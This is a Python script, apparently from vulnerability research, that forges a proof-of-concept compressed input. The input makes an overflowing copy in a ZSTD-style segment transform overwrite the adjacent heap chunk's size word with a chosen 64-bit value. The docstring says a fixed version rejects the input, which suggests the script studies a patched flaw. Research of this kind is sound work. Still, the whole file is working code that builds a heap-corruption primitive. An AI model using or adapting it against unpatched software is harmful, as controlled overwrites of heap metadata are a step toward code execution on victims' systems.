#!/usr/bin/env python3
"""W186: forge a mixed-full PoC whose COPY2 bytes encode a chosen 64-bit word.

The W184 mixed-full chunk makes COPY2 write 128 file-chosen bytes at
dst+256..+384.  In the pinned ZSTD segment transform the decompressed source
bytes of that copy are an interleave of the two halves of segment 1:

    source[2*i]     = seg1[i]       (i = 0..63)
    source[2*i + 1] = seg1[64 + i]  (i = 0..63)

so the eight bytes at source offsets 8..15, which land on the adjacent
malloc chunk's size word at dst+264, are controlled by seg1[4:8] and
seg1[68:72].  All other segment-1 bytes are BYTE, so the rest of the
overwrite stays uniform.  The fixed v3.5.3 guard still rejects the chunk.

Usage: make_size_word_poc.py BASE OUT WORD [N] [BYTE] [U]
"""
import subprocess
import sys

BASE, OUT, WORD = sys.argv[1], sys.argv[2], int(sys.argv[3], 0)
N = int(sys.argv[4]) if len(sys.argv) > 4 else 64
BYTE = int(sys.argv[5], 0) if len(sys.argv) > 5 else 0x5A
U = int(sys.argv[6]) if len(sys.argv) > 6 else 4 * N
if not 0 <= WORD < 1 << 64:
    raise SystemExit("WORD must fit in 64 bits")

seg1 = bytearray([BYTE]) * (2 * N)
word = WORD.to_bytes(8, "little")
for j in range(4):
    seg1[4 + j] = word[2 * j]
    seg1[68 + j] = word[2 * j + 1]

subprocess.run(
    [sys.executable, "cases/make_poc_mixed_full.py", BASE, OUT,
     str(N), hex(BYTE), str(U), seg1.hex()],
    check=True,
)
print(f"W186: word=0x{WORD:016x} seg1[4:8]={seg1[4:8].hex()} "
      f"seg1[68:72]={seg1[68:72].hex()}")
